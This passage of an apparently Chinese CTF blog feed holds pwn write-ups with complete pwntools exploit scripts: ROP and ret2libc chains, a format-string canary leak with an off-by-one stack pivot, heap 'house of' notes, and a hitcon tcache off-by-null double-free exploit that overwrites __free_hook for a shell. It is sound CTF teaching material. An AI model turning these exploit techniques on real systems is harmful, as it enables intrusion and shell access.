class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2be51</span></span><br><span class="line">pop_rdxi_r12 = libc_base + <span class="number">0x11f2e7</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;c&quot;</span>*<span class="number">32</span> + <span class="string">b&quot;d&quot;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写./flag到bss+0x100</span></span><br><span class="line">payload += p64(pop_rsi) + p64(bss) + p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="number">0</span>) +p64(pop_rdx_r12) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)+ p64(open_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) +  p64(flag) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)+ p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印出flag</span></span><br><span class="line">payload += p64(pop_rdi) + p64(flag) + p64(puts_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&quot;./flag&quot;</span>)</span><br><span class="line">io.interactive()             </span><br></pre></td></tr></table></figure><h1 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h1><p>ret2libc注意printf要栈对齐</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;27.25.151.12&#x27;</span>,<span class="number">32833</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x401293</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">offset=<span class="number">32</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak_addr= u64(p.recvuntil(b&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;leak_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(leak_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;puts&quot;,leak_addr)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(system_addr)))</span><br><span class="line">log.success(<span class="string">&quot;bin_sh_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*offset+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2+=p64(ret)+p64(pop_rdi)</span><br><span class="line">payload2+=p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h1><p>格式化字符串把canary，libc，还有栈（后面利用off-by-one栈迁移）的地址泄露出来，刚好看到后面vuln有个off-by-one，通过溢出rbp后一个字节导致函数到我们写完数据的地方重启main函数</p><p>不知道为什么我本地打这个一直打不通，不过也就是最后一步，system函数被变成其他的，好在远程打得通，不然真怀疑人生了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;27.25.151.12&#x27;</span>,<span class="number">30861</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27; that?&#x27;</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;aaaaaaaa%29$p%11$p%15$p%13$p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">14</span>).ljust(<span class="number">16</span>,<span class="string">b&#x27;0&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x29d90</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">main=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">last_byte = (stack &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload=p64(canary)*<span class="number">2</span>+p64(main)+p64(canary)+p8(last_byte)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>-<span class="number">0x8</span>)+p64(canary)*<span class="number">2</span>+p64(pop_rdi) + p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;a gift!&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;again?????&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="syscall（没出）"><a href="#syscall（没出）" class="headerlink" title="syscall（没出）"></a>syscall（没出）</h1><p>给了三次执行syscall的机会，四个参数可以任意调整，不知道为什么利用<code>shmget</code>+<code>shmat</code>就把libc泄露出来了</p><h1 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h1><p>没学到io怎么打。。。。，回头学完再来</p>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>house of系列</title>
      <link href="/posts/16606.html"/>
      <url>/posts/16606.html</url>
      
        <content type="html"><![CDATA[<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>这篇主要是自己记录</p><p>图来自<a href="https://hollk.blog.csdn.net/article/details/117112930">好好说话之House Of Einherjar-CSDN博客</a></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411072021576.png" alt="8f1aa2d976405baa7dce4788d6596429"></p><blockquote><p>就是通过在第一个chunk之前的伪造chunk 再free合并后再申请回来时，获得了指定位置的chunk</p></blockquote><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>2.27失效</p><h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>这个主要是通过对top chunk的利用，通过堆溢出改写top chunk的值</p><p>把top_chunk的size改成-1</p><h2 id="向前"><a href="#向前" class="headerlink" title="向前"></a>向前</h2><p>molloc到指定位置的距离（负的）加上4（32位）或者8（64位）</p><h2 id="向后"><a href="#向后" class="headerlink" title="向后"></a>向后</h2><p>malloc很大的数字就可以，算下偏移即可(可以直接溢出到栈上)</p><h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>2.27限定了申请范围，失效</p><h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用</p>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcon_2018_children_tcache题解</title>
      <link href="/posts/6297.html"/>
      <url>/posts/6297.html</url>
      
        <content type="html"><![CDATA[<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>先看保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411051636654.png" alt="image-20241105163620624"></p><p>很好，保护全开</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411051636443.png" alt="image-20241105163659318"></p><p>这里的部分函数我进行了重命名，方便阅读</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411051638895.png" alt="image-20241105163802763"></p><p>这里有个strcpy这个函数会在赋值后自动给字符串末尾加上\x00.这里存在一个off-by-null漏洞</p><p>同时这里free函数有个可恶的污染，会把你的free掉后的数据全部填充为\xda</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411051640243.png" alt="image-20241105164013194"></p><p>因此我们再后面的进行堆重叠是要先利用上面的off-by-null漏洞把prev_size位置清空出来</p><blockquote><p>总结一下这个题目的思路，首先创造四个堆快 分别大 小 大 小</p><p>前三个用来进行堆重叠，在通过大堆快的unsortbin实现泄露libc后，通过free函数时伪造一个prev_size导致合并过度的堆块地址，导致有一个被回收的地址，但是函数逻辑中没有被回收，从而实现double free从而把改写free_hook为libc</p></blockquote><h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><h2 id="我们先创建4个chunk-并且按顺序free0-1"><a href="#我们先创建4个chunk-并且按顺序free0-1" class="headerlink" title="我们先创建4个chunk,并且按顺序free0 1"></a>我们先创建4个chunk,并且按顺序free0 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>我们在这里看一下堆里面的情况</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411052109399.png" alt="image-20241105210909303"></p><p>细看一下我们申请的第二个堆快（也就是0x5578b988b670）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411052112227.png" alt="屏幕截图 2024-11-05 211008"></p><h2 id="重复利用off-by-null，填入假prev-size"><a href="#重复利用off-by-null，填入假prev-size" class="headerlink" title="重复利用off-by-null，填入假prev_size"></a>重复利用off-by-null，填入假prev_size</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span> - i,<span class="string">b&#x27;s&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411052114915.png" alt="image-20241105211448850"></p><p>可以看到已经实现</p><h2 id="free第二个堆快，实现堆快之间的合并"><a href="#free第二个堆快，实现堆快之间的合并" class="headerlink" title="free第二个堆快，实现堆快之间的合并"></a>free第二个堆快，实现堆快之间的合并</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411052117629.png" alt="image-20241105211701578"></p><p>可以看到这里已经实现</p><blockquote><p>这时，我们注意申请堆快的返回地址处</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411052118429.png" alt="image-20241105211853352"></p><p>这里有三个返回地址，而我们只能看到两个返回地址了，这是因为我们在合并堆快的时候”吃”掉了一个堆，但是返回地址没有置零</p></blockquote><p>并且因为堆快的合并，fd bk指针被移动到前面那个堆块处，而这个堆快我们刚好可以直接控制</p><h2 id="打印我们布置好的堆快，获得libc，并计算一系列地址"><a href="#打印我们布置好的堆快，获得libc，并计算一系列地址" class="headerlink" title="打印我们布置好的堆快，获得libc，并计算一系列地址"></a>打印我们布置好的堆快，获得libc，并计算一系列地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">shell=leak+<span class="number">0x4f322</span> <span class="comment">#0x4f2be 0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line">free_hook=leak+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="再次申请一个可以放入tcache的chunk，让存申请的堆快的返回地址处出现两个一样的地址"><a href="#再次申请一个可以放入tcache的chunk，让存申请的堆快的返回地址处出现两个一样的地址" class="headerlink" title="再次申请一个可以放入tcache的chunk，让存申请的堆快的返回地址处出现两个一样的地址"></a>再次申请一个可以放入tcache的chunk，让存申请的堆快的返回地址处出现两个一样的地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411052128164.png" alt="image-20241105212810124"></p><h2 id="依次释放0-2，就可以进行对free函数的改写了-最后调用free获得布置好的one-gadget"><a href="#依次释放0-2，就可以进行对free函数的改写了-最后调用free获得布置好的one-gadget" class="headerlink" title="依次释放0 2，就可以进行对free函数的改写了,最后调用free获得布置好的one_gadget"></a>依次释放0 2，就可以进行对free函数的改写了,最后调用free获得布置好的one_gadget</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(shell))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="getshell！！！"><a href="#getshell！！！" class="headerlink" title="getshell！！！"></a>getshell！！！</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411052129883.png" alt="image-20241105212954858"></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,27626)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Data&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span> - i,<span class="string">b&#x27;s&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shell=leak+<span class="number">0x4f322</span> <span class="comment">#0x4f2be 0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line">free_hook=leak+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#add(0x)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(shell))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache attack</title>
      <link href="/posts/8335.html"/>
      <url>/posts/8335.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><blockquote><p>tcache 是在glibc2.26后新引入的一个机制，在释放一个堆快的时候，如果这个堆快大小小于0x400并且tcache bin还有空间时，就会把函数放进tcache bins中</p></blockquote><h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><p>以下的实验版本为Ubuntu18.04</p><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 